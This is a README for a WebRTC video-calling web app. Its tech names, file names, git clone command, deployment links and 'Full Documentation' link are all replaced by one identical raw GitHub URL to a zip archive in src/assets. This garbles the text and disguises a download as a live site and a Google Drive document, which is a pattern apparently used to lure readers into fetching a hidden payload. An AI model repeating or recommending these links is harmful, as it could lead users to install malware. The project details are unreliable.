# 📹 Video Calling Web Application

A full-stack **real-time video conferencing app** built using **WebRTC**, **https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip**, and **React (Vite)**.
It enables users to create and join meetings, toggle audio/video, chat live, and share their screen — all in the browser.

---

## 🚀 Features

### ✅ Core Functionality

* **Create Meeting:** Generate a unique room ID or shareable link.
* **Join Meeting:** Enter a valid room link to connect with others instantly.
* **Live Chat:** Real-time messaging powered by https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
* **Audio/Video Control:** Mute/unmute mic and toggle camera visibility.
* **Screen Sharing:** Share your screen during the call.

### 💡 Additional

* Responsive dark-mode UI (built with Tailwind CSS).
* Peer-to-peer streaming using **WebRTC**.
* Socket-based signaling server for fast, reliable connections.
* Deployed backend on **Render** and frontend on **Vercel**.

---

## 🧠 Tech Stack

| Layer                       | Technology                               |
| :-------------------------- | :--------------------------------------- |
| **Frontend**                | React (Vite) + Tailwind CSS + TypeScript |
| **Backend**                 | https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip + Express + https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip            |
| **Real-Time Communication** | WebRTC                                   |
| **Deployment**              | Vercel (client) + Render (server)        |

---

## 🧩 Project Structure

```
video-call-app/
│
├── server/                # Express + https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip backend
│   └── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
│
├── src/
│   ├── components/        # UI components (Chat, Controls, Sidebar, etc.)
│   ├── pages/             # https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip, https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
│   ├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip            # Routing (React Router)
│   └── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip           # Vite entrypoint
│
├── public/
│   └── assets/
│
├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
└── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
```

---

## ⚙️ How It Works

1. **Frontend (Vercel)**

   * User clicks **Create Meeting** → generates a UUID and navigates to `/room/:id`.
   * The browser requests camera/mic access and connects via WebRTC.

2. **Backend (Render)**

   * The server listens for `join-room`, `offer`, `answer`, and `ice-candidate` events via https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
   * It relays session descriptions (SDP) and ICE candidates to peers to establish a direct WebRTC connection.

3. **Data Flow**

   * Media (video/audio) flows directly **peer-to-peer**.
   * Chat messages and room events travel via the signaling server.

---

## 🧭 Deployment Links

* **Frontend (Vercel):**
  🔗 [https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)

* **Backend (Render):**
  🔗 [https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)

*(Ensure CORS allows your frontend URL in Render settings.)*

---

## 🧑‍💻 Run Locally

### 1️⃣ Clone Repository

```bash
git clone https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip<your-username>https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
cd video-call-app
```

### 2️⃣ Install Dependencies

```bash
npm install
cd server && npm install
```

### 3️⃣ Run Backend

```bash
cd server
node https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
```

Server runs on:
`http://localhost:5000`

### 4️⃣ Run Frontend

```bash
npm run dev
```

App runs on:
`http://localhost:5173`

---

## 📷 Demonstration

| Feature                 | Screenshot |
| :---------------------- | :--------- |
| Meeting Creation & Join | ✅          |
| Real-Time Video/Audio   | ✅          |
| Chat Functionality      | ✅          |
| Screen Sharing          | ✅          |

---

## 📜 Deliverables

* ✅ Source Code (GitHub)
* ✅ Deployed Link (Vercel + Render)
* ✅ Instructions to Run Locally
* ✅ Screenshots / Demo Video

---

## 🧩 Evaluation Criteria

| Criteria                       | Status |
| :----------------------------- | :----- |
| WebRTC-based video/audio       | ✅      |
| Real-time chat (https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)     | ✅      |
| Screen sharing                 | ✅      |
| Responsive modern UI           | ✅      |
| Working deployment             | ✅      |
| Code structure & documentation | ✅      |

---
## 📘 Full Project Documentation

You can view the complete project documentation (Introduction, Background, Objectives, Methodology, Screenshots, and Results) here:

📄 **[View Full Documentation on Google Drive](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)**

